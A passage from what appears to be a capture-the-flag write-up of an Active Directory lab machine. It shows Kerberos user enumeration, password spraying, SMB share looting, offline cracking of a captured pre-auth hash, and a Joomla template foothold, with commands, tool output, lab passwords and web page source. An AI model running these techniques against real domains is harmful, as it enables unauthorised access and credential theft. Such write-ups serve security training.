assword\u0026#34;:\u0026#34;h0lograms4retaking0ver754!\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;db\u0026#34;:\u0026#34;joomla_db\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;dbprefix\u0026#34;:\u0026#34;if2tx_\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;dbencryption\u0026#34;:0,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;dbsslverifyservercert\u0026#34;:false,\u0026#34;id\u0026#34;:224}}],\u0026#34;meta\u0026#34;:{\u0026#34;total-pages\u0026#34;:4}} credentials\nroot:h0lograms4retaking0ver754! at a first glance it looks like a credential for the database of the joomla service. i tried to login using the cred to joomla admin panel no luck there.\nad enumeration using the above credential i tried to login using smb, ldap no luck there too. because i only possesed one username administrator, having only this will not help. i had a password so i can try password spraying attack on the ad but i needed some valid usernames.\nbecause kerberos is enabled on the machine it can help us to gather usernames. because by default i think kerberos authentication on ad returns a unique error for usernames that don\u0026rsquo;t exist.\nuser enumeration (kerberos)\nusing kerbrute by ropnop i tested a list of users against kerberos and tried to find some valid usernames.\n$ kerbrute userenum --dc dc.office.htb -d office.htb ~/seclists/usernames/xato-net-10-million-usernames.txt -o kerbrute.log __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ version: dev (n/a) - 04/28/24 - ronnie flathers @ropnop 2024/04/28 13:08:53 \u0026gt; using kdc(s): 2024/04/28 13:08:53 \u0026gt; dc.office.htb:88 2024/04/28 13:09:30 \u0026gt; [+] valid username:\tadministrator@office.htb 2024/04/28 13:12:34 \u0026gt; [+] valid username:\tadministrator@office.htb 2024/04/28 13:13:57 \u0026gt; [+] valid username:\tewhite@office.htb 2024/04/28 13:13:57 \u0026gt; [+] valid username:\tetower@office.htb 2024/04/28 13:13:58 \u0026gt; [+] valid username:\tdwolfe@office.htb 2024/04/28 13:13:59 \u0026gt; [+] valid username:\tdlanor@office.htb 2024/04/28 13:13:59 \u0026gt; [+] valid username:\tdmichael@office.htb 2024/04/28 13:54:19 \u0026gt; [+] valid username:\thhogan@office.htb now let\u0026rsquo;s try netexec to spray the password using these usernames.\n$ nxc ldap dc.office.htb -u ad_users.txt -p \u0026#39;h0lograms4retaking0ver754!\u0026#39; ldap 10.10.11.3 389 dc.office.htb [-] error retrieving os arch of 10.10.11.3: could not connect: timed out smb 10.10.11.3 445 dc [*] windows server 2022 build 20348 (name:dc) (domain:office.htb) (signing:true) (smbv1:false) ldap 10.10.11.3 389 dc [-] office.htb\\administrator:h0lograms4retaking0ver754! ldap 10.10.11.3 389 dc [-] office.htb\\administrator:h0lograms4retaking0ver754! ldap 10.10.11.3 389 dc [-] office.htb\\ewhite:h0lograms4retaking0ver754! ldap 10.10.11.3 389 dc [-] office.htb\\etower:h0lograms4retaking0ver754! ldaps 10.10.11.3 636 dc [+] office.htb\\dwolfe:h0lograms4retaking0ver754! looks like i got a match for the user dwolfe. let\u0026rsquo;s enumerate his shares.\nsmb enumeration\n$ nxc smb dc.office.htb -u \u0026#39;dwolfe\u0026#39; -p \u0026#39;h0lograms4retaking0ver754!\u0026#39; --shares smb 10.10.11.3 445 dc [*] windows server 2022 build 20348 (name:dc) (domain:office.htb) (signing:true) (smbv1:false) smb 10.10.11.3 445 dc [+] office.htb\\dwolfe:h0lograms4retaking0ver754! smb 10.10.11.3 445 dc [*] enumerated shares smb 10.10.11.3 445 dc share permissions remark smb 10.10.11.3 445 dc ----- ----------- ------ smb 10.10.11.3 445 dc admin$ remote admin smb 10.10.11.3 445 dc c$ default share smb 10.10.11.3 445 dc ipc$ read remote ipc smb 10.10.11.3 445 dc netlogon read logon server share smb 10.10.11.3 445 dc soc analysis read smb 10.10.11.3 445 dc sysvol read logon server share i found an unusual share named soc analysis let\u0026rsquo;s dump it using smbclient.\n$ smbclient \u0026#39;\\\\10.10.11.3\\soc analysis\u0026#39; -u dwolfe -l password for [workgroup\\dwolfe]: try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . d 0 wed may 10 13:52:24 2023 .. dhs 0 wed feb 14 04:18:31 2024 latest-system-dump-8fbc124d.pcap a 1372860 sun may 7 19:59:00 2023 6265599 blocks of size 4096. 1193500 blocks available smb: \\\u0026gt; get latest-system-dump-8fbc124d.pcap getting file \\latest-system-dump-8fbc124d.pcap of size 1372860 as latest-system-dump-8fbc124d.pcap (387.6 kilobytes/sec) (average 387.6 kilobytes/sec) smb: \\\u0026gt; exit let\u0026rsquo;s analyze the pcap file using wireshark.\npcap analysis\nasreqroast - cracking pre-auth timestamp\nafter analyzing the pcap file i found two as-req. in a typical kerberos setup the the pre-auth feature is enabled by default. if it is enabled we cannot perform asreproast attack. but it opens another vector for an attack. in kerberos when pre-auth is enabled the client encrypts the current timestamp with it\u0026rsquo;s own password as an encryption key. so, if the password is weak enough we can obtain it using hashcat by trying to decrypt the cipher which is shown in the figure. here the etype is 18. so the mode for hashcat would be 19900. which depicts pre-auth in hashcat\u0026rsquo;s documentation.\nalso i discovered the cname object contained cname-string: tstark this is the user sending the request. so the user is tstark@office.htb. now let\u0026rsquo;s construct the hash for hashcat.\nhashcat\nhash\n$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc cracked\n$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69 foothold i tried the cracked password against the ad but didn\u0026rsquo;t work. but it worked against joomla admin dashboard. let\u0026rsquo;s try to get a reverse shell on joomla dashboard using templates. i got a shell of the web_account user.\nc:\\xampp\\htdocs\\joomla\\templates\\cassiopeia\u0026gt;whoami office\\web_account c:\\xampp\\htdocs\\joomla\\templates\\cassiopeia\u0026gt; the htdocs folder contained anothe directory named internal besides joomla.\nc:\\xampp\\htdocs\u0026gt;dir volume in drive c has no label. volume serial number is c626-9388 directory of c:\\xampp\\htdocs 05/09/2023 07:53 am \u0026lt;dir\u0026gt; . 01/24/2024 05:08 am \u0026lt;dir\u0026gt; .. 05/09/2023 07:53 am \u0026lt;dir\u0026gt; administrator 01/30/2024 09:39 am \u0026lt;dir\u0026gt; internal 04/30/2024 07:15 am \u0026lt;dir\u0026gt; joomla 0 file(s) 0 bytes 5 dir(s) 5,044,477,952 bytes free c:\\xampp\\htdocs\u0026gt; one file seemed interesting inside the internal directory. it was resume.php.\nc:\\xampp\\htdocs\\internal\u0026gt;dir volume in drive c has no label. volume serial number is c626-9388 directory of c:\\xampp\\htdocs\\internal 01/30/2024 09:39 am \u0026lt;dir\u0026gt; . 05/09/2023 07:53 am \u0026lt;dir\u0026gt; .. 02/14/2024 06:35 pm \u0026lt;dir\u0026gt; applications 05/01/2023 04:27 pm \u0026lt;dir\u0026gt; css 05/01/2023 04:27 pm \u0026lt;dir\u0026gt; img 01/30/2024 09:38 am 5,113 index.html 01/30/2024 09:40 am 5,282 resume.php 2 file(s) 10,395 bytes 5 dir(s) 5,038,227,456 bytes free resume.php\n\u0026lt;?php $notifi = \u0026#34;\u0026#34;; if($_server[\u0026#34;request_method\u0026#34;] == \u0026#34;post\u0026#34; ){ $stdname=trim($_post[\u0026#39;fullname\u0026#39;]); $email=str_replace(\u0026#39;.\u0026#39;,\u0026#39;-\u0026#39;,$_post[\u0026#39;email\u0026#39;]); $experience=trim($_post[\u0026#39;experience\u0026#39;]); $salary=trim($_post[\u0026#39;salary\u0026#39;]); $department=trim($_post[\u0026#39;department\u0026#39;]); $rewritefn = strtolower(str_replace(\u0026#39; \u0026#39;,\u0026#39;-\u0026#39;,\u0026#34;$stdname-$department-$salary $experience $email\u0026#34;)); $filename =$_files[\u0026#39;assignment\u0026#39;][\u0026#39;name\u0026#39;]; $filetype= $_files[\u0026#39;assignment\u0026#39;][\u0026#39;type\u0026#39;]; $filesize =$_files[\u0026#39;assignment\u0026#39;][\u0026#39;size\u0026#39;]; $fileerr = $_files[\u0026#39;assignment\u0026#39;][\u0026#39;error\u0026#39;]; $filetmp = $_files[\u0026#39;assignment\u0026#39;][\u0026#39;tmp_name\u0026#39;]; chmod($_files[\u0026#39;assignment\u0026#39;][\u0026#39;tmp_name\u0026#39;], 0664); // onigiri in . $ext = explode(\u0026#39;.\u0026#39;,$filename); //last piece of data from array $extension = strtolower(end($ext)); $filesallowed = array(\u0026#39;docm\u0026#39;,\u0026#39;docx\u0026#39;,\u0026#39;doc\u0026#39;,\u0026#39;odt\u0026#39;); if(in_array($extension,$filesallowed)){ if ($fileerr === 0){ if ($filesize \u0026lt; 5242880){ $ff = \u0026#34;$rewritefn.$extension\u0026#34;; $loc = \u0026#34;applications/\u0026#34;.$ff; if(move_uploaded_file($filetmp,$loc)) { // upload successful $notifi=\u0026#34;\u0026lt;span class=notifi\u0026gt; upload successful!\u0026lt;/span\u0026gt;\u0026lt;hr/\u0026gt;\u0026lt;style\u0026gt; button, input , select, option, h3{ display:none; } \u0026lt;/style\u0026gt;\u0026#34;; } else { echo $loc; $notifi=\u0026#34;\u0026lt;span class=notifi\u0026gt; something went wrong! unable to upload the resume!\u0026lt;/span\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;; } } else { $notifi=\u0026#34;\u0026lt;span class=notifi\u0026gt; your resume should be less than 5mb!\u0026lt;/span\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;; } } else { $notifi=\u0026#34;\u0026lt;span class=notifi\u0026gt; corrupted file/unable to upload!\u0026lt;/span\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;; } } else { $notifi=\u0026#34;\u0026lt;span class=notifi\u0026gt; accepted file types : doc, docx, docm, odt!\u0026lt;/span\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;; } } ?\u0026gt; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;https://www.pinclipart.com/picdir/big/344-3445944_png-file-svg-terminal-icon-png-clipart.png\u0026#34;\u0026gt; \u0026lt;title\u0026gt;resume submission\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; body{ height:100%; overflow:auto; } .notifi{ font-weight:bold; padding:0px; } .notifi hr{ background:#000000; height:2px; } .magic{ margin-top:0.5%; max-height:90%; max-width:90%; border: 2px solid #000000; } .inpstylef{ border-bottom: 2px solid #000000; padding:0.5%; font-size:14px; font-weight:bold; } .inputstyle ,.inpstyles { width:69%; height:35px; border:2px solid #000000; } .inpstylef::-webkit-file-upload-button { visibility: hidden; } .inpstylef::before { content: \u0026#39; \u0026#39;; display: inline-block; border: 1px solid #999; border-radius: 3px; padding: 5px 8px; outline: none; white-space: nowrap; -webkit-user-select: none; cursor: pointer; text-shadow: 1px 1px #fff; font-weight: 700; font-size: 10pt; } ::placeholder{ color:#151715; opacity:1; font-weight:bold; } .magic h3{ text-align: left; padding-left: 260px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt; \u0026lt;div class=\u0026#34;magic\u0026#34;\u0026gt; \u0026lt;h1\u0026gt; job application submission\u0026lt;/h1\u0026gt; \u0026lt;hr style=\u0026#34;width:inherit;padding:0px;height:2px; background:#000000\u0026#34;/\u0026gt; \u0026lt;span class=\u0026#34;notifi\u0026#34;\u0026gt;\u0026lt;?php echo \u0026#34;$notifi\u0026#34;; ?\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;full name:\u0026lt;/h3\u0026gt; \u0026lt;input class=\u0026#34;inputstyle\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;fullname\u0026#34; placeholder=\u0026#34;example : john doe\u0026#34; required\u0026gt; \u0026lt;h3\u0026gt;email:\u0026lt;/h3\u0026gt; \u0026lt;input class=\u0026#34;inputstyle\u0026#34; type=\u0026#34;email\u0026#34; name=\u0026#34;email\u0026#34; placeholder=\u0026#34; example : xxx123@xyz.abc\u0026#34; required\u0026gt; \u0026lt;h3\u0026gt;work experience\u0026lt;/h3\u0026gt; \u0026lt;select id=\u0026#34;\u0026#34; style=\u0026#34;background:#151715; color:#ffffff; font-weight:bold\u0026#34; class=\u0026#34;inpstyles\u0026#34; name=\u0026#34;experience\u0026#34; required\u0026gt; \u0026lt;option class=\u0026#34;inpstyl\u0026#34;\u0026gt;0-5 years\u0026lt;/option\u0026gt; \u0026lt;option class=\u0026#34;inpstyl\u0026#34;\u0026gt;10-20 years\u0026lt;/option\u0026gt; \u0026lt;option class=\u0026#34;inpstyl\u0026#34;\u0026gt;20-30 years\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;h3\u0026gt;requested salary\u0026lt;/h3\u0026gt; \u0026lt;select id=\u0026#34;\u0026#34; class=\u0026#34;inpstyles\u0026#34; style=\u0026#34;background:#151715; color:#ffffff; font-weight:bold\u0026#34; name=\u0026#34;salary\u0026#34; required\u0026gt; \u0026lt;option value=\u0026#34;30 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;30 000$\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;60 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;60 000$\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;80 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;80 000$\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;100 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;100 000$\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;200 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;200 000$\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;300 000\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;300 000$\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt;\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;h3\u0026gt;choose your department\u0026lt;/h3\u0026gt; \u0026lt;select id=\u0026#34;\u0026#34; class=\u0026#34;inpstyles\u0026#34;style=\u0026#34;background:#151715; color:#ffffff; font-weight:bold\u0026#34; name=\u0026#34;department\u0026#34; required\u0026gt; \u0026lt;option value=\u0026#34;it\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;it\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;sales\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;sales\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;management\u0026#34; class=\u0026#34;inpstyl\u0026#34;\u0026gt;management\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt;\u0026lt;div style=\u0026#34;display:flex; flex-direction:column; align-items: center;justify-content: center;\u0026#34;\u0026gt; \u0026lt;h3 style=\u0026#34;padding-left:50px\u0026#34; \u0026gt;upload resume:\u0026lt;/h3\u0026gt; \u0026lt;input id=\u0026#34;\u0026#34; class=\u0026#34;inpstylef\u0026#34; type=\u0026#34;file\u0026#34; name=\u0026#34;assignment\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; style=\u0026#34;margin-bottom:15px; color:#ffffff; background:#151715; width:50%; font-weight:bold ;height:35px\u0026#34; name=\u0026#34;submit\u0026#34;\u0026gt;upload resume\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; privilege escalation using runascs.exe i was able to get tstark\u0026rsquo;s shell and found the user flag.\nc:\\users\\tstark\\desktop\u0026gt;dir dir volume in drive c has no label. volume serial number is c626-9388 directory of c:\\users\\tstark\\desktop 04/29/2024 02:40 am \u0026lt;dir\u0026gt; . 01/18/2024 11:33 am \u0026lt;dir\u0026gt; .. 04/29/2024 02:40 am 7,168 a.exe 04/28/2024 09:59 pm 34 user.txt 2 file(s) 7,202 bytes 2 dir(s) 4,989,374,464 bytes free c:\\users\\tstark\\desktop\u0026gt; after a lot of enumeration i found some open ports on the box.\nc:\\users\\tstark\\downloads\u0026gt;netstat -ano | findstr \u0026#34;listening\u0026#34; netstat -ano | findstr \u0026#34;listening\u0026#34; tcp 0.0.0.0:80 0.0.0.0:0 listening 4612 tcp 0.0.0.0:88 0.0.0.0:0 listening 684 tcp 0.0.0.0:135 0.0.0.0:0 listening 920 tcp 0.0.0.0:389 0.0.0.0:0 listening 684 tcp 0.0.0.0:443 0.0.0.0:0 listening 4612 tcp 0.0.0.0:445 0.0.0.0:0 listening 4 tcp 0.0.0.0:464 0.0.0.0:0 listening 684 tcp 0.0.0.0:593 0.0.0.0:0 listening 920 tcp 0.0.0.0:636 0.0.0.0:0 listening 684 tcp 0.0.0.0:3268 0.0.0.0:0 listening 684 tcp 0.0.0.0:3269 0.0.0.0:0 listening 684 tcp 0.0.0.0:3306 0.0.0.0:0 listening 7116 tcp 0.0.0.0:3389 0.0.0.0:0 listening 352 tcp 0.0.0.0:5985 0.0.0.0:0 listening 4 tcp 0.0.0.0:8083 0.0.0.0:0 listening 4612 tcp 0.0.0.0:9389 0.0.0.0:0 listening 2916 tcp 0.0.0.0:47001 0.0.0.0:0 listening 4 tcp 0.0.0.0:49664 0.0.0.0:0 listening 684 tcp 0.0.0.0:49665 0.0.0.0:0 listening 544 tcp 0.0.0.0:49666 0.0.0.0:0 listening 1172 tcp 0.0.0.0:49667 0.0.0.0:0 listening 1560 tcp 0.0.0.0:49668 0.0.0.0:0 listening 684 tcp 0.0.0.0:49670 0.0.0.0:0 listening 2260 tcp 0.0.0.0:55479 0.0.0.0:0 listening 684 tcp 0.0.0.0:55485 0.0.0.0:0 listening 684 tcp 0.0.0.0:55495 0.0.0.0:0 listening 664 tcp 0.0.0.0:60177 0.0.0.0:0 listening 7220 tcp 0.0.0.0:60180 0.0.0.0:0 listening 7244 tcp 10.10.11.3:53 0.0.0.0:0 listening 7220 tcp 10.10.11.3:139 0.0.0.0:0 listening 4 tcp 127.0.0.1:53 0.0.0.0:0 listening 7220 tcp [::]:80 [::]:0 listening 4612 tcp [::]:88 [::]:0 listening 684 tcp [::]:135 [::]:0 listening 920 tcp [::]:443 [::]:0 listening 4612 tcp [::]:445 [::]:0 listening 4 tcp [::]:464 [::]:0 listening 684 tcp [::]:593 [::]:0 listening 920 tcp [::]:3306 [::]:0 listening 7116 tcp [::]:3389 [::]:0 listening 352 tcp [::]:5985 [::]:0 listening 4 tcp [::]:8083 [::]:0 listening 4612 tcp [::]:9389 [::]:0 listening 2916 tcp [::]:47001 [::]:0 listening 4 tcp [::]:49664 [::]:0 listening 684 tcp [::]:49665 [::]:0 listening 544 tcp [::]:49666 [::]:0 listening 1172 tcp [::]:49667 [::]:0 listening 1560 tcp [::]:49668 [::]:0 listening 684 tcp [::]:49670 [::]:0 listening 2260 tcp [::]:55479 [::]:0 listening 684 tcp [::]:55485 [::]:0 listening 684 tcp [::]:55495 [::]:0 listening 664 tcp [::]:60177 [::]:0 listening 7220 tcp [::]:60180 [::]:0 listening 7244 tcp [::1]:53 [::]:0 listening 7220 port 8083 seemed to run a a internal http service i previously found.\nc:\\users\\tstark\\downloads\u0026gt;curl -x get 127.0.0.1:8083 curl -x get 127.0.0.1:8083 % total % received % xferd average speed time time time current dload upload total spent left speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0\u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- required meta tags --\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1, shrink-to-fit=no\u0026#34;\u0026gt; \u0026lt;!-- bootstrap css --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/squarely.css\u0026#34;\u0026gt; \u0026lt;!--common.css --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/common.css\u0026#34;\u0026gt; \u0026lt;title\u0026gt;holography industries\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--navbar --\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-expand-lg navbar-dark bg-primary\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;business\u0026lt;/a\u0026gt; \u0026lt;button class=\u0026#34;navbar-toggler\u0026#34; type=\u0026#34;button\u0026#34; data-toggle=\u0026#34;collapse\u0026#34; data-target=\u0026#34;#navbarnav\u0026#34; aria-controls=\u0026#34;navbarnav\u0026#34; aria-expanded=\u0026#34;false\u0026#34; aria-label=\u0026#34;toggle navigation\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;navbar-toggler-icon\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;collapse navbar-collapse\u0026#34; id=\u0026#34;navbarnav\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;navbar-nav ml-auto\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;nav-item active\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;home \u0026lt;span class=\u0026#34;sr-only\u0026#34;\u0026gt;(current)\u0026lt;/span\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;resume.php\u0026#34;\u0026gt;submit application\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;services\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;about\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;div class=\u0026#34;hero-header\u0026#34; style=\u0026#34;background-image: url(\u0026#39;img/business.jpg\u0026#39;)\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;holography industries\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;world leader in holographic technologies\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!--main content--\u0026gt; \u0026lt;div class=\u0026#34;container mb-4 mt-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-8 mb-3\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;about us\u0026lt;/h2\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;p\u0026gt;we are all incredibly passionated about holograms at holography industries. we strongly believe that we are contributing to a brighter future for humanity.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;life\u0026#39;s all about evolution : and we are doing just that.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;make a phone call\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-4 align-items-center d-md-flex\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;img-fluid\u0026#34; src=\u0026#34;img/girl.jpg\u0026#34; alt=\u0026#34;lapi_girl\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!--3 cards--\u0026gt; \u0026lt;div class=\u0026#34;container-fluid mb-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row bg-light p-md-5\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-4 mb-3\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;card-img-top\u0026#34; src=\u0026#34;img/1.jpg\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;know more about us\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;our offices are currently all located in new york. if you would like to work with us, pay us a visit!\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card-footer\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;find out more!\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-4 mb-3\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;card-img-top\u0026#34; src=\u0026#34;img/2.jpg\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;what we do?\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;just a bunch of passionate engineers trying to make the world a better place for everyone!\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card-footer\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;find out more!\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-4 mb-3\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;card-img-top\u0026#34; src=\u0026#34;img/3.jpg\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;contact us\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;you can either contact us by email or by phone. holographytech@holographytechnologies.htb | 514-000-000\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;card-footer\u0026#34;\u0026gt; 100 5113 100 5113 0 0 1492k 0 --:--:-- --:--:-- --:--:-- 1664k utton class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;find out more!\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!--footer--\u0026gt; \u0026lt;div class=\u0026#34;py-3 bg-light text-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;m-0\u0026#34;\u0026gt;copyright by \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;holographictech.htb\u0026lt;/a\u0026gt; 2030\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- optional javascript --\u0026gt; \u0026lt;!-- jquery first, then popper.js, then bootstrap js --\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.3.1.slim.min.js\u0026#34; integrity=\u0026#34;sha384-q8i/x+965dzo0rt7abk41jstqiaqvgrvzpbzo5smxkp4yfrvh+8abtte1pi6jizo\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\u0026#34; integrity=\u0026#34;sha384-uo2et0cphqdsjq6hjty5kvphtphzwj9wo1clhtmga3jdzwrnqq4sf86dihndz0w1\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script 